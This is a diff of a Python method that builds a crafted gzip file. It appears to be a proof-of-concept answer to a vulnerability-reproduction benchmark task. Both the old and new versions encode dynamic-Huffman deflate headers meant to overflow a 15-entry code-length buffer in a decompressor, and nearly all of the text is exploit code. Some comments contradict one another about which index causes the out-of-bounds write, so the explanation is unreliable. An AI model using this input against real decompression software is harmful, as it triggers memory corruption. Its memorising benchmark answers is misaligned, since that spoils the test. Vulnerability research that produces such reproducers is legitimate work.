@@ -2,101 +2,90 @@ import struct
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        # Minimal GZIP header (10 bytes)
-        # ID1=1f, ID2=8b, CM=8, FLG=0, MTIME=0, XFL=0, OS=0
-        header = b'\x1f\x8b\x08\x00\x00\x00\x00\x00\x00\x00'
+        # GZIP Header (10 bytes)
+        poc = bytearray([0x1f, 0x8b, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00])
         
-        bits = []
+        val = 0
+        bits = 0
+        output = bytearray()
         
-        def add_bits(val, n):
-            # Standard LSB-first packing for fixed-width fields
+        def write_bits(v, n):
+            nonlocal val, bits, output
             for i in range(n):
-                bits.append((val >> i) & 1)
-        
-        def add_val_reverse(val, n):
-            # MSB-first packing for Huffman codes
-            for i in range(n - 1, -1, -1):
-                bits.append((val >> i) & 1)
+                if (v >> i) & 1:
+                    val |= (1 << bits)
+                bits += 1
+                if bits == 8:
+                    output.append(val)
+                    val = 0
+                    bits = 0
+                    
+        def write_huffman_code(code_val, code_len):
+            # Huffman codes are packed MSB first
+            for i in range(code_len - 1, -1, -1):
+                bit = (code_val >> i) & 1
+                write_bits(bit, 1)
 
         # Deflate Block Header
-        add_bits(1, 1) # BFINAL = 1
-        add_bits(2, 2) # BTYPE = 2 (Dynamic Huffman)
+        write_bits(1, 1)   # BFINAL = 1
+        write_bits(2, 2)   # BTYPE = 2 (Dynamic Huffman)
+        write_bits(0, 5)   # HLIT = 0 (257 codes)
+        write_bits(0, 5)   # HDIST = 0 (1 code)
+        write_bits(14, 4)  # HCLEN = 14 (18 code lengths). 
+                           # Max is 15 (19 codes). 14 is enough to include index 17 (Sym 1).
+                           # This is > 11, so it provides enough codes to overflow a buffer of size 15.
+
+        # Code Lengths for the Code Length Alphabet
+        # We need to define a tree to encode the Lit/Dist lengths (258 items).
+        # We need Sym 18 (repeat 0), Sym 0 (literal 0), Sym 1 (literal 1).
+        # Permutation: 16, 17, 18, 0, 8, ... 14, 1.
+        # Index 2 -> Sym 18. Index 3 -> Sym 0. Index 17 -> Sym 1.
+        # We set lengths to 2 for these, 0 for others.
+        # Writing to Index 2 (Sym 18) corresponds to len_codes[18], which is OOB (buffer size 15).
         
-        # Dynamic Huffman Header
-        # HLIT = 0 -> 257 Literal/Length codes (257)
-        add_bits(0, 5) 
-        # HDIST = 0 -> 1 Distance code (1)
-        add_bits(0, 5) 
-        # HCLEN = 1 -> 5 Code Length codes (4 + 1)
-        # The loop runs for 5 iterations: indices 16, 17, 18, 0, 8.
-        # Vulnerability: The vulnerable version has buffer size 15.
-        # Writing to indices 16, 17, 18 (first 3 iterations) overflows the buffer.
-        add_bits(1, 4) 
+        cl_vals = [0] * 18
+        cl_vals[2] = 2     # Sym 18 -> Len 2
+        cl_vals[3] = 2     # Sym 0  -> Len 2
+        cl_vals[17] = 2    # Sym 1  -> Len 2
         
-        # Code Lengths (3 bits each)
-        # Indices: 16, 17, 18, 0, 8
-        # We need to define a Huffman tree for the code lengths to encode the tree structure.
-        # We need Symbol 18 (Repeat 0) and Symbol 8 (Length 8).
-        # We assign:
-        # 16: Length 3 (filler to complete tree)
-        # 17: Length 0 (unused)
-        # 18: Length 1 (Code 0)
-        # 0:  Length 2 (Code 10)
-        # 8:  Length 3 (Code 110)
-        # Filler 16 gets Code 111
-        # Values to write:
-        # Idx 0 (16): 3
-        # Idx 1 (17): 0
-        # Idx 2 (18): 1
-        # Idx 3 (0):  2
-        # Idx 4 (8):  3
-        table = [3, 0, 1, 2, 3]
-        for v in table:
-            add_bits(v, 3)
+        for v in cl_vals:
+            write_bits(v, 3)
             
-        # Huffman Tree Definition (encoded using the above tree)
-        # Literal/Length Tree:
-        # We need 256 zeros (for 0..255).
-        # Use Symbol 18 (Code 0) with count 138 (max): 7 bits '1111111'
-        add_val_reverse(0, 1)
-        add_bits(127, 7) # 138 - 11 = 127
-        # Remaining 118 zeros.
-        # Use Symbol 18 (Code 0) with count 118: 7 bits '1101011'
-        add_val_reverse(0, 1)
-        add_bits(107, 7) # 118 - 11 = 107
+        # Huffman Codes (Canonical):
+        # Sym 0:  00
+        # Sym 1:  01
+        # Sym 18: 10
         
-        # Literal 256 (EOB): Length 8
-        # Use Symbol 8 (Code 110)
-        add_val_reverse(6, 3)
+        # Encode Lit/Dist Lengths (258 lengths total)
+        # Sequence: 256 zeros (0..255), 1 one (256/EOB), 1 zero (Dist 0).
         
-        # Distance Tree:
-        # Distance 0: Length 8
-        # Use Symbol 8 (Code 110)
-        add_val_reverse(6, 3)
+        # 1. 138 zeros using Sym 18
+        write_huffman_code(0b10, 2) # Sym 18
+        write_bits(127, 7)          # Count 138 (127 + 11)
+        
+        # 2. 118 zeros using Sym 18
+        write_huffman_code(0b10, 2) # Sym 18
+        write_bits(107, 7)          # Count 118 (107 + 11)
+        
+        # 3. 1 one using Sym 1 (for EOB)
+        write_huffman_code(0b01, 2) # Sym 1
+        
+        # 4. 1 zero using Sym 0 (for Dist 0)
+        write_huffman_code(0b00, 2) # Sym 0
         
         # Compressed Data
-        # Output EOB (Literal 256).
-        # In the defined tree, Literal 256 has Length 8.
-        # It is the only code of length 8, so its code is all zeros (Canonical Huffman).
-        add_val_reverse(0, 8)
+        # Only symbol 256 (EOB) is present.
+        # Lit/Dist tree has Sym 256 with length 1. Code is '0'.
+        write_huffman_code(0, 1)
         
-        # Pack bits into bytes
-        byte_array = bytearray()
-        cur = 0
-        cnt = 0
-        for b in bits:
-            if b:
-                cur |= (1 << cnt)
-            cnt += 1
-            if cnt == 8:
-                byte_array.append(cur)
-                cur = 0
-                cnt = 0
-        if cnt > 0:
-            byte_array.append(cur)
+        # Flush remaining bits
+        if bits > 0:
+            output.append(val)
             
-        # GZIP Trailer (8 bytes)
-        # CRC32 (0) and ISIZE (0) for empty content
-        trailer = b'\x00\x00\x00\x00\x00\x00\x00\x00'
+        poc.extend(output)
         
-        return header + bytes(byte_array) + trailer
+        # GZIP Footer (CRC32 and ISIZE for empty file are 0)
+        poc.extend(struct.pack("<I", 0))
+        poc.extend(struct.pack("<I", 0))
+        
+        return bytes(poc)
